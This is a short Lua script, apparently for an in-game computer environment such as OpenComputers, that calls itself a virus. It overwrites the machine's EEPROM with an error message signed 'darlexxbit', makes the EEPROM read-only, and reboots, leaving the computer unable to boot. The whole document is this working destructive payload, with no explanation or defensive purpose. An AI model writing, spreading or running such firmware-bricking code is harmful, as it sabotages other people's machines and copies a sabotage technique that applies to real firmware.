local component = require("component")
local computer = require("computer")

component.eeprom.set('error("virus by darlexxbit")')
local checksum = component.eeprom.getChecksum()
component.eeprom.makeReadonly(checksum)

computer.shutdown(true)